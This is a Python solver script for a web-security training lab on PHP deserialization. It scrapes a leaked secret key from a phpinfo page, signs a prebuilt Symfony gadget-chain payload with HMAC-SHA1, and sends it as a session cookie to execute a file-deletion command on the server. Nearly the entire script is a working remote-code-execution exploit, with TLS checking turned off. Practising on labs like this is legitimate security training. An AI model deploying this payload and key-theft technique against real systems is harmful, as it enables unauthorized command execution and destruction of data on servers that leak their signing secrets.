import requests
from colorama import Fore
import urllib3
import re
import base64
import hashlib
import hmac

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting PHP deserialization with a pre-built gadget chain"


def run(url, payload=None, proxies=None):
    url = url.rstrip('/')
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the phpinfo page\n2. Extract the secret key\n3. Sign the payload with the secret key\n4. Fetch the home page with the modified object as session to delete the morale.txt file\n""")

    print("[1] Fetching the phpinfo page")
    phpinfo_page = requests.get(f"{url}/cgi-bin/phpinfo.php", allow_redirects=False,
                                verify=False, proxies=proxies)

    print("[2] Extracting the secret key")
    secret_key = re.findall(
        "SECRET_KEY </td><td class=\"v\">(\w*) </td>", phpinfo_page.text)[0]
    print(Fore.GREEN + "secret_key" + Fore.WHITE + " => " + Fore.YELLOW + secret_key)

    print("[3] Signing the payload with the secret key")

    print("The payload was generated using the following commands:")
    print("git clone https://github.com/ambionics/phpggc.git")
    print("cd phpggc")
    print("./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0")
    payload = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg=="
    sig_hmac_sh1 = hmac.new(secret_key.encode(), payload.encode(), hashlib.sha1).hexdigest()
    serialized_object = f"""{{"token":"{payload}","sig_hmac_sha1":"{sig_hmac_sh1}"}}"""

    print("[4] Fetching the home page with the modified object as session to delete the morale.txt file")


    cookies = {"session": serialized_object}

    requests.get(f"{url}/", cookies=cookies, allow_redirects=False,
                 verify=False, proxies=proxies)
    return True
